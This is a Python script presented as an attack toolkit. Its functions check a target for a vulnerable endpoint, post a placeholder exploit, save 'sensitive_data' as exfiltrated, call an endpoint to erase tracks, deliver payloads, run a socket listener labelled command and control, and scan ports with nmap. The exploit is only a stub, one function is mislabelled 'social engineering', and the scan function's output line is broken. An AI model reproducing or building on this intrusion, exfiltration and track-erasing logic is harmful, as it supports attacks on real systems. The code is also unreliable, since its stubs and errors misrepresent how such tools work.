import time
import logging
import requests
import os
from requests.adapters import HTTPAdapter
from requests.exceptions import RequestException, HTTPError, ConnectionError, Timeout
from urllib3.util.retry import Retry
from scapy.all import *
import socket
import nmap
import concurrent.futures
from typing import Optional

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Create a session with retry strategy
session = requests.Session()
retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
adapter = HTTPAdapter(max_retries=retries)
session.mount('https://', adapter)
session.mount('http://', adapter)

def is_vulnerable(target: str) -> bool:
    try:
        response = session.get(f"http://{target}/vulnerable_endpoint", timeout=5)
        response.raise_for_status()
        return "vulnerable" in response.text
    except (HTTPError, ConnectionError, Timeout) as e:
        logging.error(f"Error checking vulnerability: {e}")
    return False

def craft_exploit(target: str) -> str:
    return f"EXPLOIT_CODE_FOR_{target}"

def execute_exploit(target: str, exploit_code: str) -> None:
    try:
        response = session.post(f"http://{target}/execute_exploit", data={"exploit": exploit_code}, timeout=5)
        response.raise_for_status()
        if response.status_code == 200:
            logging.info("Exploit executed successfully.")
        else:
            logging.warning("Failed to execute exploit.")
    except (HTTPError, ConnectionError, Timeout) as e:
        logging.error(f"Error executing exploit: {e}")

def exfiltrate_data(target: str) -> None:
    try:
        response = session.get(f"http://{target}/sensitive_data", timeout=5)
        response.raise_for_status()
        if response.status_code == 200:
            with open("exfiltrated_data.txt", "w") as file:
                file.write(response.text)
            logging.info("Data exfiltrated successfully.")
        else:
            logging.warning("Failed to exfiltrate data.")
    except (HTTPError, ConnectionError, Timeout) as e:
        logging.error(f"Error exfiltrating data: {e}")

def erase_tracks(target: str) -> None:
    try:
        response = session.post(f"http://{target}/erase_tracks", timeout=5)
        response.raise_for_status()
        if response.status_code == 200:
            logging.info("Tracks erased successfully.")
        else:
            logging.warning("Failed to erase tracks.")
    except (HTTPError, ConnectionError, Timeout) as e:
        logging.error(f"Error erasing tracks: {e}")

def exploit(target: str) -> None:
    try:
        if is_vulnerable(target):
            exploit_code = craft_exploit(target)
            execute_exploit(target, exploit_code)
            time.sleep(2)
            exfiltrate_data(target)
            erase_tracks(target)
            logging.info("Exploit successful. Data exfiltrated and tracks erased.")
        else:
            logging.info("Target is not vulnerable.")
    except Exception as e:
        logging.error(f"An error occurred during exploitation: {e}")

def deliver_payload(target: str, payload: str, retries: int = 3, delay: int = 2, timeout: int = 5) -> bool:
    attempt = 0
    while attempt < retries:
        try:
            response = session.post(f"https://{target}/deliver_payload", data={"payload": payload}, timeout=timeout)
            response.raise_for_status()
            if response.status_code == 200:
                logging.info("Payload delivered successfully.")
                return True
            else:
                logging.warning(f"Failed to deliver payload. Status code: {response.status_code}")
        except (HTTPError, ConnectionError, Timeout) as e:
            logging.error(f"Error delivering payload: {e}")

        attempt += 1
        if attempt < retries:
            logging.info(f"Retrying in {delay} seconds... (Attempt {attempt}/{retries})")
            time.sleep(delay)

    logging.error("Failed to deliver payload after multiple attempts.")
    return False

def social_engineering(target: str) -> None:
    try:
        packet = IP(dst=target) / TCP(dport=80) / f"GET /evil_payload HTTP/1.1\r\nHost: {target}\r\n\r\n"
        send(packet, verbose=False)
        logging.info("Social engineering attack executed successfully.")
    except Exception as e:
        logging.error(f"An error occurred during the social engineering attack: {e}")

def command_and_control(target_ip: str) -> None:
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("", 0))
    server_socket.listen(1)
    host, port = server_socket.getsockname()
    logging.info(f"Command and control server listening on {host}:{port}...")

    try:
        while True:
            client_socket, address = server_socket.accept()
            logging.info(f"Connection established with {address}")

            while True:
                command = client_socket.recv(1024).decode()
                if not command:
                    break

                result = execute_command(command, target_ip)
                client_socket.send(result.encode())

            client_socket.close()
    except Exception as e:
        logging.error(f"An error occurred in the command and control server: {e}")
    finally:
        server_socket.close()

def execute_command(command: str, target_ip: str) -> str:
    if command.startswith("scan "):
        parameters = command.split()[1:]
        return perform_scan(target_ip, *parameters)
    else:
        return f"Unknown command: {command}"

def perform_scan(target: str, scan_type: str = "-p 1-1000", scan_args: str = "") -> str:
    nm = nmap.PortScanner()
    nm.scan(target, arguments=f"{scan_type} {scan_args}")

    open_ports = []
    for host in nm.all_hosts():
        for protocol in nm[host].all_protocols():
            for port in nm[host][protocol].keys():
                if nm[host][protocol][port]['state'] == 'open':
                    open_ports.append(f"{protocol.upper()} ({port})")

    if open_ports:
        return f"Open ports on {target}:\n" + "\n.join(open_ports)"
    else:
        return f"No open ports found on {target}"